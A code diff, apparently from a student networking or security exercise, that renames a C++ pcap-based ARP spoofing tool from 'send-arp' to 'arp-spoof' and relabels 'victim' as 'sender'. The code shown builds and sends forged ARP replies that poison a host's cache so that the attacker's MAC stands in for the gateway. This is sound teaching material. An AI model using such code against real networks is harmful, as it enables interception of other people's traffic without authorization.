@@ -16,8 +16,8 @@ struct EthArpPacket final {
 #pragma pack(pop)
 
 void usage() {
-	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
-	printf("sample : send-arp enp6s0 192.168.200.163 192.168.200.254\n");
+	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
+	printf("sample : arp-spoof enp6s0 192.168.200.163 192.168.200.254\n");
 }
 
 struct Param {
@@ -76,7 +76,7 @@ Ip getMyIp(const char* dev) {
 	return Ip(ntohl(sin->sin_addr.s_addr));
 }
 
-Mac getVictimMac(pcap_t* pcap, Mac attackerMac, Ip attackerIp, Ip senderIp) {
+Mac getSenderMac(pcap_t* pcap, Mac attackerMac, Ip attackerIp, Ip senderIp) {
 	EthArpPacket packet;
 
 	// arp request 브로드캐스트 하기
@@ -147,14 +147,14 @@ int main(int argc, char* argv[]) {
 		Ip senderIp = param.pairs_[i].first;
 		Ip targetIp = param.pairs_[i].second;
 
-		// 3. Victim MAC 주소 휙득
-		Mac victimMac = getVictimMac(pcap, attackerMac, attackerIp, senderIp);
-		printf("Victim MAC: %s\n", std::string(victimMac).c_str());
+		// 3. Sender MAC 주소 획득
+		Mac senderMac = getSenderMac(pcap, attackerMac, attackerIp, senderIp);
+		printf("Sender MAC: %s\n", std::string(senderMac).c_str());
 
-		// 4. Victim에게 ARP Infection 패킷 전송
+		// 4. Sender에게 ARP Infect 패킷 전송
 		EthArpPacket packet;
 
-		packet.eth_.dmac_ = victimMac;
+		packet.eth_.dmac_ = senderMac;
 		packet.eth_.smac_ = attackerMac;
 		packet.eth_.type_ = htons(EthHdr::Arp);
 
@@ -165,7 +165,7 @@ int main(int argc, char* argv[]) {
 		packet.arp_.op_ = htons(ArpHdr::Reply);
 		packet.arp_.smac_ = attackerMac; // smac은 공격자 MAC 주소
 		packet.arp_.sip_ = htonl(targetIp); // sip은 라우터 IP 주소 
-		packet.arp_.tmac_ = victimMac;
+		packet.arp_.tmac_ = senderMac;
 		packet.arp_.tip_ = htonl(senderIp);
 
 		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
